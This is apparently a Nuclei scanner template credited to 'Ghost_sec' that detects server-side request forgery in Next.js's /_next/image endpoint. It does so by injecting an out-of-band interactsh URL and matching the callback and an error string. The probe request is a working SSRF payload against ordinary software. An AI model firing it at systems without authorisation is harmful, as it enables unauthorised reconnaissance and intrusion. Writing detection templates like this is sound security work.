id: SSRF-DETECTION

  #________.__                    __                          
 #/  _____/|  |__   ____  _______/  |_    ______ ____   ____  
#/   \  ___|  |  \ /  _ \/  ___/\   __\  /  ___// __ \_/ ___\ 
#\    \_\  \   Y  (  <_> )___ \  |  |    \___ \\  ___/\  \___ 
 #\______  /___|  /\____/____  > |__|   /____  >\___  >\___  >
        #\/     \/           \/              \/     \/     \/ 
info:
  name: SSRF Vulnerability in NextJS
  author: Ghost_sec #Don't replace dipshit
  severity: high

http:
  - method: GET
    path:
      - '{{BaseURL}}/_next/image?w=16&q=10&url=https://{{interactsh-url}}'
      - '{{BaseURL}}/_next/image?w=16&q=10&url=https://{{interactsh-url}}'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - 'http'

      - type: word
        part: body
        words:
          - "The requested resource isn't a valid image"
